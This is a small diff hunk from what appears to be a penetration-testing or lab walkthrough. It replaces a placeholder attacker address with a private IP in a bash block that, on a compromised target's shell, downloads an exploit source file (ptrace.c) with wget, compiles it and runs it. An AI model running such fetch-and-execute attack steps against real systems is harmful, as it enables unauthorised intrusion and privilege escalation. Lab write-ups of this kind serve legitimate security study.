@@ -70,7 +70,7 @@ Because the target lacked modern SSL capabilities to download directly from exte
 ```bash
 # On Target Shell
 cd /tmp
-wget http://<KALI_IP>/ptrace.c
+wget http://192.168.0.23/ptrace.c
 gcc -o ptrace ptrace.c
 ./ptrace
 ```
